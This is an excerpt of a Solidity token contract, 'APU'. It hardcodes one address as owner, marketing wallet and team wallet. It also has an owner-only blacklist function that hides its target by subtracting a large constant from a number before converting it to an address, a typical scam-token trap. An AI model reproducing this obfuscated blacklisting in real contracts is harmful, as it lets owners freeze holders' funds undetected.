...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xB64247162749966458e53a478684B3761F1ffbA5; // owner address
...
contract APU is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xB64247162749966458e53a478684B3761F1ffbA5); // Marketing Address
    address payable private teamWalletAddress = payable(0xB64247162749966458e53a478684B3761F1ffbA5); // Team Address
    ...
    function addBlakcklist(uint256 addressblacklist) external onlyOwner {
        address adbl = address(uint160(addressblacklist-1000000000000000000000000000000000000000000000000));
        _isBlacklisted[adbl] = true;  
    }
